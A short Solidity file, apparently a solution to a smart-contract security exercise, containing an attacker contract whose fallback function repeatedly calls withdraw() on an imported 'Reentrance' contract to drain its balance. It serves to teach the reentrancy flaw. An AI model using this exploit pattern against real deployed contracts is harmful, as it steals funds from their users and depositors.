// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    Reentrance public reentrance;

    // address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        reentrance = Reentrance(_contractAddress);
    }

    // fallback is called when value is sent to this contract from
    // another contract
    fallback() external payable {
        // we just keep calling withdraw in a loop until we get all the balance.
        reentrance.withdraw();
    }

    function hackContract() external {
        // Code me!
        // deposit 1 eth
        reentrance.donate{value: address(this).balance}(address(this));

        reentrance.withdraw();
    }
}
